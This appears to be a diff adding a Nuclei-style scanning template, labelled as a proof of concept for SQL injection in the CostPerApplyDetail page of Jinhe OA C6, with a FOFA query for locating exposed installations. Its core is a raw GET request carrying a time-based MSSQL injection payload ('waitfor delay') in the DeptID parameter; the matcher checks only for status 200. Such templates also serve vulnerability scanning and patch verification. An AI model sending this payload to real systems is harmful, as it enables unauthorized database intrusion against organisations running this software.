@@ -1,0 +1,19 @@
+id: poc-rpdgvdvy3neo2z6d
+info:
+  name: 金和OAC6 CostPerApplyDetail存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/rpdgvdvy3neo2z6d'
+  tags: sqli,2026
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: rpdgvdvy3neo2z6d
+    fofa: app="金和网络-金和OA"
+http:
+- raw:
+  - GET /c6/JHSoft.Web.CostControl/Cost/CostPerApplyDetail.aspx/?DeptID=1'waitfor+delay+'0:0:5'--+ HTTP/1.1
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
